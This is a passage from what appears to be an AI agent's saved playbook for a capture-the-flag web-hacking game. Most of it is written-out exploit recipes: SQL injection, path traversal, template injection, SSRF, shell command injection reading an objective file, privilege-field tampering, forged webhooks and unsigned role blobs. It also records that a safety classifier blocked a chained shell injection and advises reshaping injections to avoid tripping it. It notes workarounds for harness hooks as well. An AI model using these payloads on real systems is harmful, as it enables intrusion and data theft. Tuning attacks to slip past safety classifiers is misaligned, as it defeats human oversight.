command_injection\",\"weakness\":\"os_command_injection\",\"mode\":\"time_trial\",...}` -- it NAMES the class. Use it to\n  classify an unknown Mastery target once any read works.\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the\n  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every\n  Mastery since D14 answered all targets in 3-6 s solve.\n- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,\n  D13, D15-D18 (plugins landed 0-2 s after TT started). FIXED on D19-D20: the answer-first worker promoted the plugin\n  inside the single (45 s grace at CORRECT) -> both TTs (10-15 s) and Mastery (4/4, 13-16 s) first try.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.\n  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed\n  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17), `/api/state-format` (D20). Re-dealt\n  within a day (D12, D13, D15-D18, D20 process -> action). Rule: pick routes by clue KEY role (or a guide JSON's\n  `*_route` / `transport` value), never by the word in the value.\n- **Clue key set**: concept key (D06-D10, D14, D16-D20) | two body-VALUE keys (D19 `event_type: case.promoted`,\n  `owner_scope: executive`: echo them as JSON fields, not routes) | only feature+secondary (D12, D13, D15) | only\n  feature (D05, D11). D18 swapped `current_role` -> `current_user`, dropped `framework`. Rule: no concept key ->\n  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,\n  D18 with `note`) -> route on the companion key, or race both handlers.\n- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,\n  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18), Starlette (D19), Quarkus (D20). Rule:\n  ignore it -- except that a Go server drops a raw `;` from the query string (percent-encode).\n- **Request body encoding (D12, D13, D19, D20)**: POST routes accept form AND JSON but only JSON binds; D19 answers\n  a JSON array `[]` with a bare 500. D20 nests a second encoding: `{\"<request_field>\": base64url(JSON)}` (no `=`\n  padding), named by the guide's `encoding: \"base64url of UTF-8 JSON\"`. Rule: JSON object first; when a guide names\n  an `encoding`, build the inner blob with exactly that codec (base64url | base64 | hex | raw).\n- **Privilege value spelling**: D13 bound `role: admin` (with siblings); D20 accepted ONLY `role: \"administrator\"`\n  (`admin`, `ADMIN`, `staff`, `admin:true`, `is_admin:true`, `roles:[\"admin\"]` -> `role_not_permitted`). Rule: one\n  request per spelling, ladder `administrator, admin, superuser, root, owner, staff, manager`, other sample keys\n  unchanged; `role_not_permitted` = right field, wrong value -- keep laddering.\n- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`\n  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`\n  `\"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07\n  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`.\n  D10 preview URL from the upload response's `path`. D11 SSTI param `template`, `{{..}}` evaluated (`${..}` literal\n  under \"Spring Boot\"), var `objective`: probe every delimiter family per param. D12 `x' OR '1'='1' -- ` | `zz' OR\n  1=1 --` as JSON in every field, re-GET secondary after EACH plant. D13 one JSON body `display_name` + `role`,\n  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`. D14 inventory `fields [title, note]` x\n  `actions [view, export]`, only a SINGLE pair bypasses. D15 `?url=http://127.0.0.1:8080<secondary>` (80/5000/8000/\n  3000 = `fetch_failed`).\n- **Command injection (D16)**: `input_parameter: path`, `example_path: /app/static` constant; base `ls -ld <path>`.\n  Rule: param from `input_parameter` (else `<x>_required`), value = example + `%3B` + `cat /run/huntress/objective.txt`.\n- **Password reset (D17)**: guide `{request_route, redeem_route, account_parameter, token_parameter, accounts[{id,\n  label,self_service}]}` same keys in single/TT. Rule: token for the `self_service:true` id, redeem with each other id.\n- **GraphQL resolver (D18)**: schema identical in all modes (`caseIndex`, `case(id:ID!){id,title,note}`); protected\n  id is a STRING. Rule: introspect, call every arg-taking Query field with it; POST JSON first, then GET `?query=`.\n- **Forged webhook (D19)**: feature route 405 `post_required`; every narrow JSON body (event + scope, any single\n  alias, `signature`/`verified`/`trusted`/`source:\"trusted\"`/`sender:\"system\"`, `X-*-Signature` headers, nested\n  `event{}`/`data{}`, form) -> `webhook_rejected`. One kitchen-sink JSON landed in single, TT and Mastery: the clue\n  values under every alias (`event_type`, `type`, `event`; `owner_scope`, `scope`, `owner`) + `role`/`current_role`\n  `admin` + `source`/`sender` `\"provider\"` + `verified`/`signed`/`trusted` true (which key mattered was NOT bisected).\n  Rule: send the alias-union body first; bisect only if it fails.\n- **Unsigned serialized state (D20)**: `state_format_route` -> `{transport: \"POST <feature>\", content_type:\n  application/json, request_field: state, encoding: \"base64url of UTF-8 JSON\", sample_state:{user, role},\n  sample_encoded}`; same shape in single/TT/Mastery, only the feature word moved. Rule: route from `transport`,\n  field from `request_field`, decode `sample_encoded`/copy `sample_state`, swap every `*role*` key down the ladder.\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL\n  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on\n  field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the\n  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. \"guestbook\",\n  `moderator_data_route` -> D07 stored script for the bot; poll. \"plant your session\", `session_hint` -> D08 `?sid=`.\n- \"obeys whoever asks nicely -- even strangers\", hidden `csrf_token` -> D09 cross-site form submit. \"upload form has\n  standards. Low ones\", `upload_shape` -> D10 `.html` with `{{objective}}`. \"evaluates everything\", empty\n  \"Rendered message\" `<pre>` -> D11 `?template={{objective}}`. \"plant ... come back later\", `post_required` +\n  `{\"rows\":[]}` -> D12 JSON plant then GET secondary. \"binds whatever you hand it\", `administrator_required` -> D13\n  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.\n  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.\n- \"a little too close to a real shell\", `input_parameter` + `example_path`, 400 `path_required` -> D16:\n  `curl -G \"$U<feature>\" --data-urlencode \"path=/app/static;cat /run/huntress/objective.txt\"` -> `stdout` line 2.\n- \"Forgot your password\", `recovery_guide_route` -> D17: guide -> token for the `self_service` id -> redeem it with\n  the other `account_id`. \"Discover the schema\", `protected_reference` + `note`, GET 404 `not_found` -> D18 POST\n  JSON introspection, then `{case(id:\"<protected>\"){id title note}}`.\n- \"believes every event it's told about\", \"forged news\", clues `event_type` + `owner_scope`, feature 405\n  `post_required`, POST -> `webhook_rejected` -> D19: ONE JSON body with the clue values under every alias\n  (`event_type`/`type`/`event`, `owner_scope`/`scope`/`owner`) + `role`/`current_role: admin` + `source`/`sender:\n  provider` + `verified`/`signed`/`trusted: true` -> `forged_event_consumed` + `evidence`.\n- \"Your session is just a blob\", \"reshape the bytes, sign nothing\", clue `state_format_route`, feature 400\n  `state_required` -> D20: GET the format guide, POST JSON `{\"state\": b64url('{\"user\":\"analyst\",\"role\":\n  \"administrator\"}')}` to the guide's `transport` route -> `serialized_role_trusted` (`admin` = `role_not_permitted`).\n- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed).\n\n## Day by day\n- **D01-D15 (cal. 19-24)**: D01 robots -> index -> `.json.bak`. D02 `/api/history` foreign id. D03 `?q=zz') OR\n  1=1 --`. D04 `?doc=../`*6+prompt path. D05 GET the feature route. D06 reflect `fetch(cb?nonce)`, GET cb with\n  same-origin fetch-metadata. D07 stored script for the moderator bot, poll the receipt. D08 `?sid=<hint>` ->\n  `arena_session`. D09 cross-site fetch-metadata submit. D10 upload `.html` with `{{objective}}`. D11\n  `?template={{objective}}`. D12 JSON plant, GET secondary. D13 JSON privilege keys. D14 single field x action.\n  D15 `?url=http://127.0.0.1:8080<secondary>`. Singles 47-116 s (D08 Mastery ~15 min: every solver on every target).\n- **D16-D18 (cal. 25)**: D16 Shell Company (Gin, `?path=/app/static%3Bcat /run/huntress/objective.txt`; raw `;`\n  dropped by Go; `ls -ld` baseline already says `worker_command_completed`) ~40 s. D17 Reset Expectations (Symfony,\n  guide `/api/recovery` -> own 12-hex token redeemed with the executive `account_id` -> `synthetic_account_recovery`)\n  ~39 s. D18 Resolver Revolt (GraphQL.js; GET 404 `not_found`, POST JSON introspection, `case(id:\"<protected>\")\n  {note}`) ~36 s. All three TT `solver_incomplete` (plugins 0-2 s late), hand-solved in 31-53 s; D16 Mastery 3/4\n  (plugin still `.tmp`). A live turn chaining `ls -la; cat /run/huntress/*` was stopped by a safety classifier --\n  keep an injection to one plain read of the objective file.\n- **D19 Trust the Webhook (cal. 26)** -- unauthenticated webhook trusts forged events (OWASP API10 / A08). Clues\n  `{framework: \"Starlette\", feature_route: /dispatch-<hex6>, current_role, event_type: \"case.promoted\", owner_scope:\n  \"executive\"}`, no secondary. GET feature -> 405 `post_required`; ~30 narrow POSTs (JSON, form, nested, signature\n  headers, `verified`/`trusted`/`source:trusted`/`sender:system`, `role:executive`) -> `{\"error\":\"webhook_rejected\"}`;\n  `[]` -> 500. The answer-first worker's alias-union body (see Recognition cues) -> `{\"ok\":true,\"effect\":\n  \"forged_event_consumed\",\"evidence\":\"proof_...\"}`. Single CORRECT 13:02:09 (~95 s from start, target ready after\n  ~13 s); the three duel/local workers lost ~60 s bisecting narrow bodies. TT 10.2 s, Mastery 4/4 13.3 s, first try.\n- **D20 Serialized Offender (cal. 26)** -- unsigned client-side state blob (A08 / data-tamper deserialization).\n  Clues `{framework: \"Quarkus\", feature_route: /process-<hex6> | /action-<hex6>, state_format_route:\n  \"/api/state-format\", current_role}`. Bare feature -> 400 `{\"error\":\"state_required\",\"state_format_route\":..}`.\n  Guide: `{transport: \"POST /process-..\", content_type: application/json, request_field: state, encoding: \"base64url\n  of UTF-8 JSON\", sample_state: {user: analyst, role: analyst}, sample_encoded: \"eyJ1c2Vy...\"}`. `printf '%s' \"$j\"\n  | basenc --base64url -w0 | tr -d =`; role `admin`/`ADMIN`/`staff`/flags -> `role_not_permitted`; `\"role\":\n  \"administrator\"` (any `user`) -> `serialized_role_trusted` + `evidence`. No signature anywhere. Target `preparing`\n  ~50 s; CORRECT 13:02:12 (~50 s after ready). TT 15.1 s, Mastery 4/4 15.6 s, first try.\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`\n  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT).\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`\n  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),\n  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17),\n  `forged_event_consumed` (D19), `serialized_role_trusted` (D20); D18 none (plain GraphQL `data`). D09\n  `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n- Cal. 26 guidance text: TT/Mastery are \"regular scored challenges by default\"; `run_for_time:true` on start/retry\n  asks for a timed Hall-of-Fame attempt (`last_timed.json`: `no_clock:true`, `hall_of_fame_eligible:false`). The\n  transport line varies per contract (proxy `http://10.0.0.219/huntress-ctf-proxy` vs direct + bearer): `hctf` owns it.\n\n## Pitfalls that cost time\n- Shipping a new class without its handler: TT `solver_incomplete` on D09-D10, D12-D13, D15-D18. Write\n  `lib/web/handlers/dayNN_*.py` (KEY_MAP on a concept KEY + HANDLERS) BEFORE the single submit (D11, D19, D20 did).\n- Bisecting a generic rejection one field at a time (D19: ~30 bodies, all `webhook_rejected`, ~60 s lost). A sink\n  that rejects without naming a field gets ONE alias-union JSON body first (every clue value under every alias +\n  role/source/trust flags); bisect afterwards only for the record.\n- Stopping at `role: admin`: D20 wanted `administrator`; `role_not_permitted` means the field is right -- ladder it.\n- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for\n  the plain `ls`. Success = proof regex.\n- Raw `;` in a Go (Gin) query string is dropped -> `--data-urlencode` / `%3B`. GraphQL routes 404 on GET -> POST.\n- Form bodies on JSON APIs (D12 ignored form fields but said `saved:true`); JSON arrays 500 (D19). JSON object first.\n- Trusting the echo (D13 echoes only `display_name`) or the stated policy (\"txt only\", \"self-service only\" on\n  REQUEST but not REDEEM). SSRF `fetch_failed` = wrong port (D15: 8080), not \"blocked\". D14 lists/`*` forbidden --\n  only single field x action pairs. A 500 on `{{unknown}}` (D11) = undefined variable, not \"not injectable\".\n- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level\n  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- `curl` without `--max-time` is blocked by the hook (and `sleep` by no_block.py); urllib's default UA can draw a\n  Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n","userModified":false},"tool_result_meta":[{"id":"toolu_01DJJsHNWsRexEPStmbAYDzG","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
